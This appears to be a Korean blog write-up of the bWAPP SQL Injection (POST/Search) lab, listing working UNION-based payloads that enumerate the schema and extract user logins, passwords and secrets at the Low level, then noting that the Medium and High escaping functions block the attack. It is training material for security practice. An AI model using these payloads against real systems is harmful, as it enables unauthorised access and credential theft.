---
layout: single
title: (bWAPP)SQL Injection POST/Search
categories: bwapp
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/sqlp-search-archive/sqlp-search/image.png)

- 게시글을 출력하는 기능이 존재
- 입력값은 POST 형식으로 전달됨

![그림 1-2](/assets/image/bwapp/injection/sqlp-search-archive/sqlp-search/image2.png)

- '(싱글 쿼터) 입력시 DBMS Error가 출력됨
- Proxy Tool을 사용하여 입력값을 전송 해도 되지만, (실제 취약점 진단시 Proxy Tool사용을 권장) 현 실습에서는 입력값을 통한 실습을 진행

```sql
' or 1=1--
```
- 위와 같이 일반적인 조건 연산자를 통한 Injection 취약점 유/무를 판단했다. 
- 정상적인 데이터 출력을 확인, 즉 조건연산자가 Injection 과 함께 사용 가능

```sql
' order by 8
```

![그림 1-3](/assets/image/bwapp/injection/sqlp-search-archive/sqlp-search/image3.png)

- order by 절을 사용하여 컬럼 개수를 파악
- 8개에서 오류가 출력됨을 확인하여 컬럼 개수는 7개로 추정

```sql
' and 1=2 union select 1,2,3,4,5,6,7--
```

- MySQL  의 경우 데이터 타입이 달라도 출력되므로 컬럼의 출력 포지션을 파악
![그림 1-4](/assets/image/bwapp/injection/sqlp-search-archive/sqlp-search/image4.png)
- 2,3,5,4 가 페이지상에 노출 됨

```sql
' and 1=2 union select 1,schema_name,3,4,5,6,7 from information_schema.schemata--
```

- 5개의 데이터베이스 존재 확인
![그림 1-5](/assets/image/bwapp/injection/sqlp-search-archive/sqlp-search/image5.png)

- 이후 순차적으로 테이블, 컬럼명들을 확인

```sql
' and 1=2 union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema='bWAPP'--
```

```sql
' and 1=2 union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema='bWAPP' and table_name='users'--
```

```sql
' and 1=2 union select 1,concat(id,0x3a,login),concat(password,0x3a,secret),4,admin,6,7 from bWAPP.users--
```

- 최종 적으로 id, login, password, secret 컬럼에 대한 데이터 추출을 시도

![그림 1-6](/assets/image/bwapp/injection/sqlp-search-archive/sqlp-search/image6.png)

- 성공적으로 데이터를 추출했다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.